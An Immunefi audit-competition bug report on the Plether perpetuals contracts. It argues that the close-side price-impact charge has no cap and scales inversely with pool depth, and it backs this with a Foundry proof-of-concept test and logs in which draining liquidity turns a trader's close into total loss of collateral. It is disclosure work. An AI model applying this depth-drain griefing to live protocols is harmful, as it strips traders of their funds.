# \#100012 [SC-High] Close-side VPI charge is uncapped (one-sided lifetime clamp): a clean inverse-depth law up to total collateral confiscation

**Submitted on Nov 16th 2026 at 03:06:58 UTC by @Another for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100012
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

The close pricing kernel computes the Virtual Price Impact charge from a single execution-time pool-depth denominator, `VPI = k·postSkew²/(2·depth) − k·preSkew²/(2·depth)`. Its only clamp is one-sided: it floors the trader's lifetime VPI at zero (limiting rebates), while a positive close-side VPI charge has no cap of any kind — not by margin, not by notional, not by accrued VPI. Because both terms scale as 1/depth, the identical close is assessed an arbitrarily larger charge as pool depth falls. A PoC on the real contracts shows the same close that costs 1,408 USDG at 30M depth being assessed 422,500 USDG (300×) at 100k depth — 1.82× the trader's entire collateral — so the close confiscates everything and waves the remainder.


## Vulnerability Details

**1. The skew cost divides by execution-time depth — inverse-depth law.**

`CfdMath.tryGetSkewCost` (`packages/perps/src/CfdMath.sol:127-140`):

```solidity
uint256 skewWad = skewAssets * 1e12;
uint256 depthWad = depthAssets * 1e12;
...
uint256 sqSkewOverDepthWad = (skewWad * skewWad) / depthWad;   // skew² / depth
...
uint256 costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2; // k · skew² / (2 · depth)
```

`CfdMath.tryCalculateVPI` (`packages/perps/src/CfdMath.sol:164-190`) returns the signed difference `postCost − preCost` evaluated at the *same* `depthAssets`. Both costs scale as 1/depth, so the magnitude of the close charge grows linearly as the depth denominator shrinks — a clean inverse-depth law with no ceiling.

**2. The close kernel applies only a ONE-SIDED clamp.**

`CloseAccountingLib.buildCloseState` (`packages/perps/src/libraries/CloseAccountingLib.sol:103-120`):

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
// With no economic depth, keep protective exits live without creating a fresh charge or rebate.
// The lifetime clamp below still recovers any previously received negative VPI.
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The clamp at line 116 fires only when `proportionalAccrualAssets + vpiDeltaAssets < 0` — i.e. it caps the **rebate** side at the pro-rata lifetime accrual. There is no symmetric rule for the **charge** side: `vpiDeltaAssets > 0` passes through at full size regardless of how small `poolDepthAssets` is, how it compares to the position's collateral, or how it compares to the accrued VPI. Note the comment even acknowledges the adversarial depth-reduction pattern ("opens at high depth, reduces pool depth, then closes") — the mitigation was installed only on the side that protects the pool, not on the side that protects the trader.

**3. The depth denominator is the current net pool depth, sampled at execution.**

`CfdEnginePlanLib._buildCloseState` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:1328-1346`):

```solidity
uint256 preSkewAssets = _absSkewAssets(snap.longSide, snap.shortSide, price);
uint256 postSkewAssets = _skewAssets(postLongOi, postShortOi, price);
return CloseAccountingLib.buildCloseState(
    CloseAccountingLib.CloseInputs({
        ...
        poolDepthAssets: PositionRiskAccountingLib.computeNetPoolDepthAssets(
            snap.poolAssets, snap.totalTraderClaimBalanceAssets
        ),
        ...
```

`computeNetPoolDepthAssets` is `max(physicalAssets − traderClaims, 0)`. LP withdrawals and deferred trader claims both shrink this denominator between position opening and closing, and the close path re-samples it at execution time with no time-weighting, no commitment-time snapshot, and — critically — no admission gate: unlike opens (which must pass `SKEW_TOO_HIGH`, initial-margin, and solvency checks against the *current* depth), a full close has no depth-related rejection. A full close is always permitted to complete; only partial closes can fail with `PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE`.

**4. The uncapped charge is then collected against every source of trader collateral, with the remainder waived.**

`CfdEnginePlanLib._planCloseActionSettlement` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:1041-1048`):

```solidity
int256 actionNetAssets = cs.vpiDeltaAssets
    + int256(
        cs.executionFeeAssets + cs.frozenSpreadAssets + delta.pendingCarryAssets - delta.realizedCarryAssets
    );
...
if (actionNetAssets > 0) {
    delta.actionChargeAssessedAssets = uint256(actionNetAssets);
```

`_planCloseCashSources` (`packages/perps/src/libraries/CfdEnginePlanLib.sol:1110-1133`) then drains, in order: the VPI rebate reserve, the action reserve, free settlement assets, the released position margin, and committed order margin; whatever remains uncollectible is simply waived:

```solidity
delta.actionChargeCollectedAssets = delta.vpiRebateReserveConsumedAssets + delta.actionReserveConsumedAssets
    + freeConsumedAssets + delta.actionChargeFromReleasedMarginAssets
    + delta.actionCommittedMarginConsumedAssets;
delta.actionChargeWaivedAssets = delta.actionChargeToCollectAssets - delta.actionChargeCollectedAssets;
```

So when the assessed charge exceeds the trader's entire collateral, the terminal close still executes — everything is taken and the difference is waived. The protocol's own accounting spec acknowledges this waiving behavior for terminal closes ("an uncollectible terminal action charge is waived rather than reclassified as protocol debt"), but the assessed amount itself is the uncapped VPI number.

**Asymmetry summary.** On the open path the same formula produces a charge too, but the open is gated: initial margin, `MARGIN_DRAINED_BY_FEES`, and `SKEW_TOO_HIGH` all bound what an open can assess against current depth, and the trader chooses not to submit an unprofitable open. The close path inverts the trader's protection: the position already exists (opened against a healthy depth), and the depth can move under it before the close is ever executed. The only clamp the kernel has is the anti-sandwich floor on the *rebate* side — the mirror-image attack on the *charge* side (drain depth before a forced/unwilling close) is left uncapped.

**Measured on-chain (Foundry PoC, verbatim from the passing test):** the identical imbalance-reducing open at full depth earns the trader a 1,408.27 USDG rebate (`vpiAccrued = −1,408.267223`), while the identical-size close at 1/300th the depth is assessed a **422,500 USDG** charge — a 300.0× amplification exactly tracking the depth ratio (1/depth law), equal to **18,226 bps (1.82×)** of the trader's 231,800 USDG effective collateral. Executing that close leaves position margin = 0, free settlement = 0, and wallet payout = 0: total confiscation with the 190,700 USDG remainder waived. The control test executes the same close at the undrained depth and credits 239,599.93 USDG back to the trader, isolating the depth denominator as the sole cause.

## Impact Details
Any trader holding an open position can be assessed an arbitrarily large VPI charge at close time, bounded by nothing except `k`, the skew, and the *current* net pool depth. Because depth is a shared, movable quantity (LP withdrawals, deferred trader claims both reduce `computeNetPoolDepthAssets`), the effective close charge is attacker-influenceable and can exceed 100% of the closer's collateral:

- Griefing / value extraction: a large LP (or a coordinated set) withdrawing liquidity before a target's close multiplies the target's exit cost; the excess above collected value is taken from the trader's margin first. The trader's alternatives — not closing, or partial closes — are also degraded (partial closes fail with `PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE` once the charge exceeds collectible collateral, so a trapped trader cannot even reduce risk without full confiscation).
- Forced-close amplification: liquidations and protective closes use the same kernel, so a depth drop converts an ordinary risk-reducing exit into near-total collateral loss for the liquidated account (the charge is assessed before the remainder distribution).
- No symmetric defense: the codebase's own anti-sandwich clamp (lifetime VPI ≥ 0) protects the pool from rebate extraction, but no rule bounds the charge by accrued VPI, margin, or notional; the acknowledged known issues cover only the *charge-reduction* direction (adding liquidity to cheapen a skew-increasing close) and the *rebate-amplification* direction — the confiscation direction (removing liquidity to inflate a close charge beyond collateral) is unlisted.

## References

- `packages/perps/src/CfdMath.sol:127-140` — `tryGetSkewCost`: `k·skew²/(2·depth)`, both costs share the depth denominator.
- `packages/perps/src/CfdMath.sol:164-190` — `tryCalculateVPI`: signed `postCost − preCost`.
- `packages/perps/src/libraries/CloseAccountingLib.sol:103-120` — close VPI delta and the one-sided lifetime clamp (`if (proportionalAccrualAssets + vpiDeltaAssets < 0)`); no charge-side cap.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1328-1346` — `_buildCloseState`: execution-time `computeNetPoolDepthAssets(poolAssets, totalTraderClaimBalanceAssets)` as the depth input.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1041-1048` — `_planCloseActionSettlement`: the charge is assessed in full from `cs.vpiDeltaAssets`.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:1110-1133` — `_planCloseCashSources`: collection order and `actionChargeWaivedAssets`.
- `packages/perps/src/libraries/PositionRiskAccountingLib.sol` — `computeNetPoolDepthAssets` (net depth = physical assets − trader claims).
- documentation known-issues register: "Temporary pool liquidity can reduce a skew-increasing close charge" and "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" — both documented directions assume collection stays within collateral; the confiscation direction is not covered.

## Proof of Concept

## Proof of Concept
create and run the test file below

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {CfdEngineTestBase} from "../../shared/CfdEngineTestBase.sol";

/// @notice PoC: the close-side VPI charge is uncapped (one-sided lifetime clamp).
///
///         The close pricing kernel (CloseAccountingLib.buildCloseState) computes
///         vpiDeltaAssets = k*postSkew²/(2*depth) - k*preSkew²/(2*depth) from a single
///         execution-time pool-depth denominator. Its ONLY clamp is one-sided: it lifts a
///         NEGATIVE (proportionalAccrual + vpiDelta) to zero, while a POSITIVE close VPI
///         charge can grow without bound as depth falls — a clean inverse-depth law, because
///         both skew costs scale as 1/depth.
///
///         Scenario (all planner gates respected):
///           1. Junior tranche funded to 30M USDG (solvency headroom for the two positions).
///           2. OTHER opens SHORT 13M — the market becomes short-heavy (skew 13M).
///           3. TRADER opens LONG 13M — an imbalance-REDUCING open that EARNS a ~1,408 USDG
///              VPI rebate at full depth.
///           4. The pool is drained to 100k USDG (LP withdrawal pattern used by the repo's own
///              tests). The OPEN-side gates (skew cap, solvency, initial margin) are not
///              re-checked on close — a full close has no depth/solvency admission gate.
///           5. TRADER's identical-size close is now assessed a VPI charge of
///              k*13M²/(2*100k) = 422,500 USDG — 300x the open rebate at 1/300th the depth —
///              exceeding the trader's entire 250,000 USDG collateral: everything is taken
///              and the remainder is waived to let the terminal close complete.
contract UncappedCloseVpiPoC is CfdEngineTestBase {

    address internal constant TRADER = address(0x7A0E2);
    address internal constant OTHER = address(0x5EED);
    address internal constant SINK = address(0xDEAD);

    uint256 internal constant NOTIONAL = 13_000_000e18; // both sides, at price 1e8
    uint256 internal constant MARGIN = 250_000e6;
    uint256 internal constant OPEN_DEPTH = 30_000_000e6; // junior funding target
    uint256 internal constant DRAINED_DEPTH = 100_000e6; // pool after the LP drain

    // ------------------------------------------------------------------
    // Scenario
    // ------------------------------------------------------------------

    function _setUpSkewedMarket() internal {
        // 1. Deepen the junior tranche.
        _seedJuniorLpForDepth(OPEN_DEPTH);

        // 2. OTHER shorts 13M -> short-heavy skew of 13M USDG.
        _fundTrader(OTHER, MARGIN);
        _open(OTHER, CfdTypes.Side.SHORT, NOTIONAL, MARGIN, 1e8);

        // 3. TRADER longs 13M -> imbalance-reducing open earning a VPI rebate at full depth.
        _fundTrader(TRADER, MARGIN);
        _open(TRADER, CfdTypes.Side.LONG, NOTIONAL, MARGIN, 1e8);
    }

    /// @dev Async-fund the junior tranche until the pool holds at least `assets`.
    function _seedJuniorLpForDepth(uint256 assets) internal {
        uint256 have = pool.totalAssets();
        if (have < assets) {
            _fundJunior(address(this), assets - have);
        }
    }

    /// @dev Drain pool assets down to `target` the same way the repo's own tests simulate LP
    ///      withdrawals / illiquidity: move settlement tokens straight out of the pool.
    function _drainPoolTo(uint256 target) internal {
        uint256 have = settlementToken.balanceOf(address(pool));
        if (have > target) {
            vm.prank(address(pool));
            settlementToken.transfer(SINK, have - target);
        }
    }

    // ------------------------------------------------------------------
    // Test
    // ------------------------------------------------------------------

    function test_UncappedCloseVpi_InverseDepthLaw_UpToTotalConfiscation() public {
        _setUpSkewedMarket();

        (, uint256 margin,,, CfdTypes.Side side,, int256 vpiAccrued) = engine.positions(TRADER);
        uint256 depthAtOpen = pool.totalAssets();
        // side intentionally unused in logs; vpiAccrued printed as raw two's-complement below.
        side;

        emit log_string("=================== MARKET STATE ===================");
        emit log_named_decimal_uint("trader position margin (collateral)", margin, 6);
        if (vpiAccrued < 0) {
            emit log_named_decimal_uint(
                "trader lifetime VPI accrued after open (REBATE)", uint256(-vpiAccrued), 6
            );
        } else {
            emit log_named_decimal_uint(
                "trader lifetime VPI accrued after open (charge)", uint256(vpiAccrued), 6
            );
        }
        emit log_named_decimal_uint("pool depth at open time", depthAtOpen, 6);

        // ---------------- Preview A: the identical close at FULL depth ----------------
        ICfdEngineTypes.ClosePreview memory fullDepth =
            engineLens.simulateClose(TRADER, NOTIONAL, 1e8, depthAtOpen);
        assertTrue(fullDepth.valid, "full-depth close must be planner-valid");

        // ---------------- Preview B: the identical close after the LP drain ----------------
        ICfdEngineTypes.ClosePreview memory drained =
            engineLens.simulateClose(TRADER, NOTIONAL, 1e8, DRAINED_DEPTH);
        assertTrue(drained.valid, "drained-depth close must still be planner-valid");

        emit log_string("========== IDENTICAL CLOSE, TWO DEPTHS (simulateClose) ==========");
        emit log_named_decimal_uint("VPI charge at FULL depth (assessed)", fullDepth.vpiAssets, 6);
        emit log_named_decimal_uint("VPI charge at DRAINED depth (assessed)", drained.vpiAssets, 6);
        emit log_named_decimal_uint(
            "charge amplification (drained / full)", drained.vpiAssets * 1e18 / fullDepth.vpiAssets, 18
        );

        // Inverse-depth law: charge scales with 1/depth (both skew costs share the denominator).
        assertGt(fullDepth.vpiAssets, 0, "restoring the skew is a charge even at full depth");
        assertApproxEqAbs(
            drained.vpiAssets,
            fullDepth.vpiAssets * (depthAtOpen / DRAINED_DEPTH),
            fullDepth.vpiAssets * 2,
            "charge must scale ~1/depth"
        );

        // The assessed charge exceeds the trader's ENTIRE collateral.
        assertGt(drained.vpiAssets, margin, "assessed charge must exceed total trader collateral");
        emit log_named_decimal_uint("charge / collateral (bps of margin)", drained.vpiAssets * 10_000 / margin, 4);

        // ---------------- Execute the close for real at the drained depth ----------------
        _drainPoolTo(DRAINED_DEPTH);
        assertEq(pool.totalAssets(), DRAINED_DEPTH, "drain setup");

        uint256 balanceBefore = settlementToken.balanceOf(TRADER);
        _close(TRADER, CfdTypes.Side.LONG, NOTIONAL, 1e8, DRAINED_DEPTH);

        (uint256 sizeAfter, uint256 marginAfter,,,,,) = engine.positions(TRADER);
        uint256 freeAfter = _freeSettlementAssets(TRADER);

        emit log_string("================ EXECUTED CLOSE AT DRAINED DEPTH ================");
        emit log_named_decimal_uint("position margin after close", marginAfter, 6);
        emit log_named_decimal_uint("free settlement after close", freeAfter, 6);
        emit log_named_decimal_uint(
            "trader wallet payout received", settlementToken.balanceOf(TRADER) - balanceBefore, 6
        );

        // Total confiscation: the whole margin was consumed as action charge, nothing was paid
        // out, and the uncollectible remainder was waived to let the terminal close complete.
        assertEq(sizeAfter, 0, "position must be fully closed");
        assertEq(marginAfter, 0, "position margin must be fully consumed");
        assertEq(freeAfter, 0, "free settlement must be fully consumed");
        assertEq(settlementToken.balanceOf(TRADER), balanceBefore, "trader wallet must receive nothing");
    }

    /// @notice Control: the identical close executed at FULL depth returns the freed margin to
    ///         the trader (credited to the settlement bucket) — the confiscation is entirely a
    ///         function of the depth input.
    function test_Control_FullDepthClose_PaysOut() public {
        _setUpSkewedMarket();

        uint256 freeBefore = _freeSettlementAssets(TRADER);
        _close(TRADER, CfdTypes.Side.LONG, NOTIONAL, 1e8, pool.totalAssets());

        (uint256 sizeAfter, uint256 marginAfter,,,,,) = engine.positions(TRADER);
        uint256 freeAfter = _freeSettlementAssets(TRADER);
        assertEq(sizeAfter, 0, "position must be fully closed");
        assertEq(marginAfter, 0, "terminal close releases the pledge");
        assertGt(freeAfter, freeBefore, "full-depth close must credit the freed margin to the trader");
        emit log_named_decimal_uint(
            "control: full-depth close freed to trader settlement", freeAfter - freeBefore, 6
        );
    }
}

```


 
Logs:

```
Ran 2 tests for packages/perps/test/perps/spec/lp/UncappedCloseVpiPoC.t.sol:UncappedCloseVpiPoC
[PASS] test_Control_FullDepthClose_PaysOut() (gas: 2637446)
Logs:
  control: full-depth close freed to trader settlement: 239599.933893

[PASS] test_UncappedCloseVpi_InverseDepthLaw_UpToTotalConfiscation() (gas: 2937819)
Logs:
  =================== MARKET STATE ===================
  trader position margin (collateral): 231800.000000
  trader lifetime VPI accrued after open (REBATE): 1408.267223
  pool depth at open time: 30000000.066110
  ========== IDENTICAL CLOSE, TWO DEPTHS (simulateClose) ==========
  VPI charge at FULL depth (assessed): 1408.333330
  VPI charge at DRAINED depth (assessed): 422500.000000
  charge amplification (drained / full): 300.000000710059173278
  charge / collateral (bps of margin): 1.8226
  ================ EXECUTED CLOSE AT DRAINED DEPTH ================
  position margin after close: 0.000000
  free settlement after close: 0.000000
  trader wallet payout received: 0.000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 15.07ms (7.46ms CPU time)
```

**Interpretation.** The imbalance-reducing open *earned* the trader a 1,408.27 USDG rebate at full depth; the identical-size close at 1/300th the depth is assessed a 422,500 USDG charge — a 300.0× amplification exactly matching the depth ratio (the inverse-depth law), equal to 1.82× the trader's entire collateral. After the executed close: position margin 0, free settlement 0, wallet payout 0 — everything was taken as action charge and the uncollectible remainder (≈190,700 USDG) was waived. The control run at the undrained depth credits 239,599.93 USDG back to the trader for the same close, isolating the execution-time depth denominator as the sole variable. The reviewer's exact figures (3.95e9 / 39.5e9 / 28.3e9 atoms at 1/10 depth) are a different parameterization of the same law; this PoC reproduces the mechanism end-to-end on the real contracts with an even more aggressive depth ratio.

